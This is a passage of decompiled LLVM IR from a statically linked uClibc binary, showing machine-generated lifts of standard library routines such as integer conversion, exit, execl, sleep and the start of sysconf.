  %v13_805112f = icmp slt i32 %v2_805112f, 0
  %v2_8051131 = icmp eq i1 %v13_805112f, %v11_805112f
  br i1 %v2_8051131, label %dec_label_pc_8051162, label %dec_label_pc_8051133

dec_label_pc_8051133:                             ; preds = %dec_label_pc_805112c
  %v1_8051133 = add i32 %v0_8051133, 1
  store i32 %v1_8051133, i32* %ebx.global-to-local, align 4
  %v0_8051134 = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_8051134, %div
  br i1 %tmp57, label %dec_label_pc_8051142, label %dec_label_pc_805113a

dec_label_pc_805113a:                             ; preds = %dec_label_pc_8051133
  %v15_8051134 = icmp eq i32 %v0_8051134, %div
  %v1_805113a = icmp eq i1 %v15_8051134, false
  br i1 %v1_805113a, label %dec_label_pc_8051158, label %dec_label_pc_805113c

dec_label_pc_805113c:                             ; preds = %dec_label_pc_805113a
  %v1_805113c = trunc i32 %v0_805115b to i8
  %tmp58 = icmp ugt i8 %v1_805113c, %v1_8051108
  br i1 %tmp58, label %dec_label_pc_8051142, label %dec_label_pc_8051158

dec_label_pc_8051142:                             ; preds = %dec_label_pc_805113c, %dec_label_pc_8051133
  store i32 %v4_8051142, i32* %eax.global-to-local, align 4
  %v0_8051146 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051146 = and i32 %v0_8051146, %v4_8051142
  store i32 %v2_8051146, i32* %ebp.global-to-local, align 4
  %v1_8051148 = call i32 @__errno_location(i32 %div)
  store i32 %v1_8051148, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_8051150 = inttoptr i32 %v1_8051148 to i32*
  store i32 34, i32* %v1_8051150, align 4
  %v0_8051114.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051116.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051114

dec_label_pc_8051158:                             ; preds = %dec_label_pc_805113c, %dec_label_pc_805113a
  %v4_8051158 = mul i32 %v0_8051134, %v1_805112f
  store i32 %v1_805112c, i32* %eax.global-to-local, align 4
  %v2_805115e = add i32 %v4_8051158, %v1_805112c
  store i32 %v2_805115e, i32* @edx, align 4
  br label %dec_label_pc_8051114

dec_label_pc_8051162:                             ; preds = %dec_label_pc_805112c, %dec_label_pc_80510f7
  %v0_805116d = phi i32 [ %v0_805116d21, %dec_label_pc_80510f7 ], [ %v0_805116d19, %dec_label_pc_805112c ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_80510f7 ], [ %div, %dec_label_pc_805112c ]
  %v4_8051162 = icmp eq i32 %arg2, 0
  br i1 %v4_8051162, label %dec_label_pc_805116f, label %dec_label_pc_8051169

dec_label_pc_8051169:                             ; preds = %dec_label_pc_8051162
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_805116d = inttoptr i32 %arg2 to i32*
  store i32 %v0_805116d, i32* %v2_805116d, align 4
  br label %dec_label_pc_805116f

dec_label_pc_805116f:                             ; preds = %dec_label_pc_8051162, %dec_label_pc_8051169
  %v0_805116f = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_805116f, i32* %eax.global-to-local, align 4
  %v1_8051171 = trunc i32 %v0_805116f to i8
  %v6_8051171 = icmp eq i8 %v1_8051171, 0
  %v2_8051173 = zext i1 %v6_8051171 to i32
  %v1_80511754 = or i32 %v2_8051173, -2147483648
  store i32 %v1_80511754, i32* %ebx.global-to-local, align 4
  %v5_805117b = icmp eq i8 %tmp37, 0
  br i1 %v5_805117b, label %dec_label_pc_8051193, label %dec_label_pc_8051182

dec_label_pc_8051182:                             ; preds = %dec_label_pc_805116f
  %v0_8051182 = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_8051182, %v1_80511754
  br i1 %tmp59, label %dec_label_pc_8051186, label %dec_label_pc_8051193

dec_label_pc_8051186:                             ; preds = %dec_label_pc_8051182
  %v1_8051186 = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_8051186, i32* %eax.global-to-local, align 4
  %v0_805118b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805118b, i32* @edx, align 4
  %v1_805118d = inttoptr i32 %v1_8051186 to i32*
  store i32 34, i32* %v1_805118d, align 4
  %v0_8051193.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051193

dec_label_pc_8051193:                             ; preds = %dec_label_pc_8051182, %dec_label_pc_805116f, %dec_label_pc_8051186
  %v0_8051193 = phi i32 [ %v0_805116f, %dec_label_pc_8051182 ], [ %v0_805116f, %dec_label_pc_805116f ], [ %v0_8051193.pre, %dec_label_pc_8051186 ]
  store i32 %v0_8051193, i32* %eax.global-to-local, align 4
  %v3_8051195 = trunc i32 %v0_8051193 to i8
  %v4_8051195 = icmp eq i8 %v3_8051195, 0
  %v0_805119e.pre = load i32, i32* @edx, align 4
  br i1 %v4_8051195, label %dec_label_pc_805119b, label %dec_label_pc_8051199

dec_label_pc_8051199:                             ; preds = %dec_label_pc_8051193
  %v1_8051199 = sub i32 0, %v0_805119e.pre
  store i32 %v1_8051199, i32* @edx, align 4
  br label %dec_label_pc_805119b

dec_label_pc_805119b:                             ; preds = %dec_label_pc_8051193, %dec_label_pc_8051199
  %v0_805119e = phi i32 [ %v1_8051199, %dec_label_pc_8051199 ], [ %v0_805119e.pre, %dec_label_pc_8051193 ]
  store i32 %v0_805119e, i32* %eax.global-to-local, align 4
  %v2_80511a0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80511a0, i32* @ebx, align 4
  ret i32 %v0_805119e

; uselistorder directives
  uselistorder i32 %v0_805119e, { 1, 0 }
  uselistorder i32 %v0_8051193, { 1, 0 }
  uselistorder i32 %v0_8051134, { 0, 2, 1 }
  uselistorder i32 %v1_8051133, { 1, 0 }
  uselistorder i32 %v2_805112f, { 1, 0 }
  uselistorder i32 %v1_805112c, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_805115b, { 1, 0 }
  uselistorder i32 %v0_8051114, { 1, 0 }
  uselistorder i32 %v4_8051142, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_8051106, { 1, 0, 2 }
  uselistorder i32 %v2_80510ea, { 1, 0 }
  uselistorder i32 %v1_80510e3, { 1, 0 }
  uselistorder i32 %v1_80510dc, { 1, 0, 2 }
  uselistorder i32 %v0_80510db, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_80510aa.lcssa, { 1, 0 }
  uselistorder i32 %v0_80510a9.lcssa, { 1, 0 }
  uselistorder i32 %v1_80510a9, { 0, 3, 2, 1 }
  uselistorder i32 %v4_805109d, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_8051097, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -17, { 36, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805119b, { 1, 0 }
  uselistorder label %dec_label_pc_8051193, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805116f, { 1, 0 }
  uselistorder label %dec_label_pc_805112c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051116, { 1, 0 }
  uselistorder label %dec_label_pc_80510f7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80510ed, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80510c9, { 1, 0 }
  uselistorder label %dec_label_pc_80510c8, { 1, 0 }
  uselistorder label %dec_label_pc_80510a9, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80511bb = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80511bb, i32* @ebx, align 4
  %v2_80511c0 = call i32 @__pthread_return_void(i32 %v2_80511bb, i32 134550975)
  %v1_80511cc = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8059aa0.254 to i32))
  %v0_80511d1 = load i32, i32* @global_var_805fd44.255, align 4
  store i32 %v0_80511d1, i32* @eax, align 4
  %v1_80511d9 = icmp eq i32 %v0_80511d1, 0
  br i1 %v1_80511d9, label %dec_label_pc_80511e6, label %dec_label_pc_80511dd

dec_label_pc_80511dd:                             ; preds = %entry
  %v0_80511e0 = load i32, i32* @esi, align 4
  %v1_80511e1 = call i32 @unknown_0(i32 %v0_80511e0)
  store i32 %v1_80511e1, i32* @eax, align 4
  br label %dec_label_pc_80511e6

dec_label_pc_80511e6:                             ; preds = %entry, %dec_label_pc_80511dd
  %v2_80511eb = call i32 @__pthread_return_void(i32 %v2_80511bb, i32 1)
  %v0_80511f0 = call i32 @__GI___uClibc_fini()
  %v0_8051201 = call i32 @_stdio_term()
  %v0_8051209 = load i32, i32* @esi, align 4
  %v1_805120a = call i32 @__GI__exit(i32 %v0_8051209)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 3, 0, 6, 5, 2, 1, 10, 9, 8, 7, 4 }
  uselistorder label %dec_label_pc_80511e6, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8051214 = load i32, i32* @ebx, align 4
  store i32 %v0_8051214, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8051217 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_8051217, i32* %eax.global-to-local, align 4
  %v12_805121a = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8051220

dec_label_pc_8051220:                             ; preds = %dec_label_pc_8051220, %entry
  %v0_8051223 = phi i32 [ 0, %entry ], [ %v1_8051223, %dec_label_pc_8051220 ]
  %stack_var_-16.0 = phi i32 [ %v2_8051217, %entry ], [ %v1_8051224, %dec_label_pc_8051220 ]
  %v1_8051223 = add i32 %v0_8051223, 1
  store i32 %v1_8051223, i32* %esi.global-to-local, align 4
  %v1_8051224 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8051224, i32* %eax.global-to-local, align 4
  %v1_805122a = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_805122a = load i32, i32* %v1_805122a, align 4
  %v3_805122a = icmp eq i32 %v2_805122a, 0
  %v1_805122d = icmp eq i1 %v3_805122a, false
  br i1 %v1_805122d, label %dec_label_pc_8051220, label %dec_label_pc_805122f

dec_label_pc_805122f:                             ; preds = %dec_label_pc_8051220
  %v1_805122f = mul i32 %v1_8051223, 4
  %v2_805122f = add i32 %v1_805122f, 34
  %v1_8051236 = and i32 %v2_805122f, -16
  %v2_8051239 = sub i32 %v12_805121a, %v1_8051236
  %v1_805123e = add i32 %v2_8051239, 15
  %v1_8051242 = and i32 %v1_805123e, -16
  store i32 %v1_8051242, i32* @ebx, align 4
  store i32 %v1_8051242, i32* %ecx.global-to-local, align 4
  %v2_8051247 = inttoptr i32 %v1_8051242 to i32*
  store i32 %arg2, i32* %v2_8051247, align 16
  store i32 %v2_8051217, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805124f

dec_label_pc_805124f:                             ; preds = %dec_label_pc_805124f, %dec_label_pc_805122f
  %stack_var_-16.1 = phi i32 [ %v2_8051217, %dec_label_pc_805122f ], [ %v1_8051256, %dec_label_pc_805124f ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8051252 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051252 = add i32 %v0_8051252, 4
  store i32 %v1_8051252, i32* %ecx.global-to-local, align 4
  %v0_8051255 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051255 = add i32 %v0_8051255, -1
  %v8_8051255 = icmp eq i32 %v1_8051255, 0
  store i32 %v1_8051255, i32* %esi.global-to-local, align 4
  %v1_8051256 = add i32 %stack_var_-16.1, 4
  %v1_805125c = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_805125c = load i32, i32* %v1_805125c, align 4
  store i32 %v2_805125c, i32* %eax.global-to-local, align 4
  %v2_805125e = inttoptr i32 %v1_8051252 to i32*
  store i32 %v2_805125c, i32* %v2_805125e, align 4
  %v1_8051260 = icmp eq i1 %v8_8051255, false
  br i1 %v1_8051260, label %dec_label_pc_805124f, label %dec_label_pc_8051262

dec_label_pc_8051262:                             ; preds = %dec_label_pc_805124f
  %v0_8051262 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051262 = load i32, i32* @esp, align 4
  %v2_8051262 = add i32 %v1_8051262, -4
  %v3_8051262 = inttoptr i32 %v2_8051262 to i32*
  store i32 %v0_8051262, i32* %v3_8051262, align 4
  %v0_8051263 = load i32, i32* @global_var_805fd4c.256, align 4
  %v2_8051263 = add i32 %v1_8051262, -8
  %v3_8051263 = inttoptr i32 %v2_8051263 to i32*
  store i32 %v0_8051263, i32* %v3_8051263, align 4
  %v0_8051269 = load i32, i32* @ebx, align 4
  %v2_8051269 = add i32 %v1_8051262, -12
  %v3_8051269 = inttoptr i32 %v2_8051269 to i32*
  store i32 %v0_8051269, i32* %v3_8051269, align 4
  %v5_805126a = add i32 %v1_8051262, -16
  %v6_805126a = inttoptr i32 %v5_805126a to i32*
  store i32 %arg1, i32* %v6_805126a, align 4
  %v1_805126d = inttoptr i32 %v1_8051256 to i8*
  %v2_805126d = call i32 @__GI_execve(i8* %v1_805126d)
  store i32 %v2_805126d, i32* %eax.global-to-local, align 4
  %v2_8051275 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051275, i32* @ebx, align 4
  ret i32 %v2_805126d

; uselistorder directives
  uselistorder i32 %v1_8051255, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8051224, { 1, 0 }
  uselistorder i32 %v1_8051223, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_8051217, { 0, 2, 1, 3 }
}

define i32 @sleep() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_805127d = load i32, i32* @edi, align 4
  %v0_805127e = load i32, i32* @esi, align 4
  %v0_805127f = load i32, i32* @ebx, align 4
  %v15_8051280 = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v1_8051292 = icmp eq i32 %tmp11, 0
  %v1_8051294 = icmp eq i1 %v1_8051292, false
  br i1 %v1_8051294, label %dec_label_pc_80512a6.preheader, label %dec_label_pc_80513f3

dec_label_pc_80512a6.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805129b

dec_label_pc_805129b:                             ; preds = %dec_label_pc_805129b.dec_label_pc_805129b_crit_edge, %dec_label_pc_80512a6.preheader
  %v0_805129b = phi i32 [ %v15_8051280, %dec_label_pc_80512a6.preheader ], [ %v0_805129b.pre, %dec_label_pc_805129b.dec_label_pc_805129b_crit_edge ]
  %v1_80512a627 = phi i32 [ 31, %dec_label_pc_80512a6.preheader ], [ %v1_80512a6, %dec_label_pc_805129b.dec_label_pc_805129b_crit_edge ]
  %v2_805129b = mul i32 %v1_80512a627, 4
  %v3_805129b = add i32 %v2_805129b, 292
  %v4_805129b = add i32 %v3_805129b, %v0_805129b
  %v5_805129b = inttoptr i32 %v4_805129b to i32*
  store i32 0, i32* %v5_805129b, align 4
  %v0_80512a6.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80512a6 = add i32 %v0_80512a6.pre, -1
  %v9_80512a6 = icmp slt i32 %v1_80512a6, 0
  store i32 %v1_80512a6, i32* %eax.global-to-local, align 4
  %v1_80512a7 = icmp eq i1 %v9_80512a6, false
  br i1 %v1_80512a7, label %dec_label_pc_805129b.dec_label_pc_805129b_crit_edge, label %dec_label_pc_80512a9

dec_label_pc_805129b.dec_label_pc_805129b_crit_edge: ; preds = %dec_label_pc_805129b
  %v0_805129b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805129b

dec_label_pc_80512a9:                             ; preds = %dec_label_pc_805129b
  store i32 %tmp11, i32* %stack_var_-24, align 4
  %v2_80512bf = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80512bf, i32* @ebx, align 4
  store i32 %v2_80512bf, i32* %stack_var_-460, align 4
  %v4_80512c7 = call i32 @__sigaddset(i32 %v2_80512bf, i32 17, i32 %v1_80512a6, i32 %v1_80512a6)
  store i32 %v4_80512c7, i32* %eax.global-to-local, align 4
  %v2_80512cf = icmp slt i32 %v4_80512c7, 0
  br i1 %v2_80512cf, label %dec_label_pc_80513f7, label %dec_label_pc_80512d7

dec_label_pc_80512d7:                             ; preds = %dec_label_pc_80512a9
  %v2_80512d8 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_80512d8, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_80512e3 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_80512e3 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_80512e3, i32 %v2_80512d8)
  store i32 %v4_80512e3, i32* %eax.global-to-local, align 4
  %v1_80512eb = icmp eq i32 %v4_80512e3, 0
  %v1_80512ed = icmp eq i1 %v1_80512eb, false
  br i1 %v1_80512ed, label %dec_label_pc_80513f7, label %dec_label_pc_80512f3

dec_label_pc_80512f3:                             ; preds = %dec_label_pc_80512d7
  store i32 %v2_80512d8, i32* %stack_var_-460, align 4
  %v4_80512f8 = call i32 @__sigismember(i32 %v2_80512d8, i32 17, i32 %v4_80512e3, i32 %v4_80512e3)
  store i32 %v4_80512f8, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8051305 = icmp eq i32 %v4_80512f8, 0
  br i1 %v1_8051305, label %dec_label_pc_8051319.preheader, label %dec_label_pc_80513c1

dec_label_pc_8051319.preheader:                   ; preds = %dec_label_pc_80512f3
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805130e

dec_label_pc_805130e:                             ; preds = %dec_label_pc_805130e.dec_label_pc_805130e_crit_edge, %dec_label_pc_8051319.preheader
  %v0_805130e = phi i32 [ %v15_8051280, %dec_label_pc_8051319.preheader ], [ %v0_805130e.pre, %dec_label_pc_805130e.dec_label_pc_805130e_crit_edge ]
  %v1_805131926 = phi i32 [ 31, %dec_label_pc_8051319.preheader ], [ %v1_8051319, %dec_label_pc_805130e.dec_label_pc_805130e_crit_edge ]
  %v2_805130e = mul i32 %v1_805131926, 4
  %v3_805130e = add i32 %v2_805130e, 292
  %v4_805130e = add i32 %v3_805130e, %v0_805130e
  %v5_805130e = inttoptr i32 %v4_805130e to i32*
  store i32 0, i32* %v5_805130e, align 4
  %v0_8051319.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8051319 = add i32 %v0_8051319.pre, -1
  %v9_8051319 = icmp slt i32 %v1_8051319, 0
  store i32 %v1_8051319, i32* %edx.global-to-local, align 4
  %v1_805131a = icmp eq i1 %v9_8051319, false
  br i1 %v1_805131a, label %dec_label_pc_805130e.dec_label_pc_805130e_crit_edge, label %dec_label_pc_805131c

dec_label_pc_805130e.dec_label_pc_805130e_crit_edge: ; preds = %dec_label_pc_805130e
  %v0_805130e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805130e

dec_label_pc_805131c:                             ; preds = %dec_label_pc_805130e
  store i32 %v2_80512bf, i32* %eax.global-to-local, align 4
  store i32 %v2_80512bf, i32* %stack_var_-460, align 4
  %v4_8051328 = call i32 @__sigaddset(i32 %v2_80512bf, i32 17, i32 0, i32 0)
  store i32 %v4_8051328, i32* %eax.global-to-local, align 4
  %v2_8051330 = icmp slt i32 %v4_8051328, 0
  br i1 %v2_8051330, label %dec_label_pc_80513f7, label %dec_label_pc_8051338

dec_label_pc_8051338:                             ; preds = %dec_label_pc_805131c
  %v2_8051339 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8051339, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8051342 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8051339)
  store i32 %v4_8051342, i32* %eax.global-to-local, align 4
  %v2_805134a = icmp slt i32 %v4_8051342, 0
  %v1_805134c = icmp eq i1 %v2_805134a, false
  br i1 %v1_805134c, label %dec_label_pc_8051376, label %dec_label_pc_805134e

dec_label_pc_805134e:                             ; preds = %dec_label_pc_8051338
  %v0_805134e = load i32, i32* %stack_var_-460, align 4
  %v1_805134e = call i32 @__errno_location(i32 %v0_805134e)
  store i32 %v1_805134e, i32* %eax.global-to-local, align 4
  store i32 %v1_805134e, i32* @ebx, align 4
  %v1_8051355 = inttoptr i32 %v1_805134e to i32*
  %v2_8051355 = load i32, i32* %v1_8051355, align 4
  store i32 %v2_8051355, i32* @esi, align 4
  store i32 %v2_80512d8, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051364 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051364 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8051364, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805136f = load i32, i32* @esi, align 4
  %v1_805136f = load i32, i32* @ebx, align 4
  %v2_805136f = inttoptr i32 %v1_805136f to i32*
  store i32 %v0_805136f, i32* %v2_805136f, align 4
  %v0_8051404.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513fa

dec_label_pc_8051376:                             ; preds = %dec_label_pc_8051338
  %v3_8051376 = load i32, i32* %stack_var_-420, align 4
  %v12_8051376 = icmp eq i32 %v3_8051376, 1
  %v2_8051382 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051382, i32* @ebx, align 4
  %v1_8051389 = icmp eq i1 %v12_8051376, false
  br i1 %v1_8051389, label %dec_label_pc_80513b0, label %dec_label_pc_805138b

dec_label_pc_805138b:                             ; preds = %dec_label_pc_8051376
  store i32 %v2_8051382, i32* %stack_var_-460, align 4
  %v2_805138f = bitcast i32* %stack_var_-24 to %timespec*
  %v3_805138f = call i32 @__libc_nanosleep(%timespec* %v2_805138f, i32 %v2_8051382)
  store i32 %v3_805138f, i32* %eax.global-to-local, align 4
  store i32 %v3_805138f, i32* @edi, align 4
  %v1_8051396 = call i32 @__errno_location(i32 %v2_8051382)
  store i32 %v1_8051396, i32* %eax.global-to-local, align 4
  store i32 %v1_8051396, i32* @ebx, align 4
  %v1_80513a0 = inttoptr i32 %v1_8051396 to i32*
  %v2_80513a0 = load i32, i32* %v1_80513a0, align 4
  store i32 %v2_80513a0, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80513a7 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80513a7 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80513a7, i32 0)
  store i32 %v4_80513a7, i32* %eax.global-to-local, align 4
  %v0_80513ac = load i32, i32* @esi, align 4
  %v1_80513ac = load i32, i32* @ebx, align 4
  %v2_80513ac = inttoptr i32 %v1_80513ac to i32*
  store i32 %v0_80513ac, i32* %v2_80513ac, align 4
  %v0_80513d6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80513d3

dec_label_pc_80513b0:                             ; preds = %dec_label_pc_8051376
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80513b6 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80513b6 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80513b6, i32 0)
  store i32 %v4_80513b6, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80513cc

dec_label_pc_80513c1:                             ; preds = %dec_label_pc_80512f3
  %v2_80513c3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80513c3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513cc

dec_label_pc_80513cc:                             ; preds = %dec_label_pc_80513b0, %dec_label_pc_80513c1
  %storemerge3.pre-phi = phi i32 [ %v2_8051382, %dec_label_pc_80513b0 ], [ %v2_80513c3, %dec_label_pc_80513c1 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_80513cc = bitcast i32* %stack_var_-24 to %timespec*
  %v3_80513cc = call i32 @__libc_nanosleep(%timespec* %v2_80513cc, i32 %storemerge3.pre-phi)
  store i32 %v3_80513cc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513d3

dec_label_pc_80513d3:                             ; preds = %dec_label_pc_805138b, %dec_label_pc_80513cc
  %v0_80513d6 = phi i32 [ %v0_80513d6.pre, %dec_label_pc_805138b ], [ %v3_80513cc, %dec_label_pc_80513cc ]
  %v1_80513d6 = icmp eq i32 %v0_80513d6, 0
  br i1 %v1_80513d6, label %dec_label_pc_80513f3, label %dec_label_pc_80513da

dec_label_pc_80513da:                             ; preds = %dec_label_pc_80513d3
  %v4_80513ea = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_80513ea, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513fa

dec_label_pc_80513f3:                             ; preds = %entry, %dec_label_pc_80513d3
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513fa

dec_label_pc_80513f7:                             ; preds = %dec_label_pc_805131c, %dec_label_pc_80512d7, %dec_label_pc_80512a9
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513fa

dec_label_pc_80513fa:                             ; preds = %dec_label_pc_80513f3, %dec_label_pc_80513da, %dec_label_pc_805134e, %dec_label_pc_80513f7
  %v0_8051404 = phi i32 [ 0, %dec_label_pc_80513f3 ], [ %v4_80513ea, %dec_label_pc_80513da ], [ %v0_8051404.pre, %dec_label_pc_805134e ], [ -1, %dec_label_pc_80513f7 ]
  store i32 %v0_805127f, i32* @ebx, align 4
  store i32 %v0_805127e, i32* @esi, align 4
  store i32 %v0_805127d, i32* @edi, align 4
  ret i32 %v0_8051404

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8051396, { 1, 0, 2 }
  uselistorder i32 %v2_8051382, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8051319, { 2, 1, 0 }
  uselistorder i32 %v2_80512d8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_80512bf, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_80512a6, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32 %tmp11, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_80513fa, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80513f3, { 1, 0 }
  uselistorder label %dec_label_pc_80513d3, { 1, 0 }
  uselistorder label %dec_label_pc_80513cc, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_8051427 [
    i32 0, label %dec_label_pc_8051437
    i32 1, label %dec_label_pc_805151c
    i32 2, label %dec_label_pc_8051441
    i32 3, label %dec_label_pc_805144b
    i32 4, label %dec_label_pc_8051455
    i32 5, label %dec_label_pc_80514eb
    i32 6, label %dec_label_pc_805145d
    i32 7, label %dec_label_pc_805141d
    i32 8, label %dec_label_pc_805141d
    i32 9, label %dec_label_pc_805141d
    i32 10, label %dec_label_pc_805141d
    i32 11, label %dec_label_pc_805141d
    i32 12, label %dec_label_pc_805141d
    i32 13, label %dec_label_pc_805141d
    i32 14, label %dec_label_pc_805141d
    i32 15, label %dec_label_pc_805141d
    i32 16, label %dec_label_pc_805141d
    i32 17, label %dec_label_pc_805141d
    i32 18, label %dec_label_pc_805141d
